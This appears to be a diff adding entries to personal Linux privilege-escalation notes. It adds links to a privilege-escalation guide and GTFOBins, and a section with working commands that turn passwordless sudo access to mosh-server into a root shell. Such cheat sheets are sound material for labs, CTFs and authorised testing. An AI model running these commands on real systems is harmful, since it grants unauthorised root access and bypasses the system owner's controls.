@@ -1,3 +1,10 @@
+
+https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html
+
+https://gtfobins.org/
+
+---
+
 /usr/bin/ssh
 
 ```
@@ -44,5 +51,19 @@ executes whatever is inside dependencies.yml
 
 ---
 
+**Priv Esc - when /mosh-server can run without password**
 
+```
+mosh --server="sudo /usr/bin/mosh-server" localhost
+```
+
+or 
+
+// use any port between 60000 and 61000 and executes the user's login shell.
+// lists out a MOSH_Key  - use it in next command 
+sudo /usr/bin/mosh-server new -p 60013
+
+MOSH_KEY=RmYsRZ1ch9feXBDfpY53jA mosh-client 127.0.0.1 60013
+
+---
 
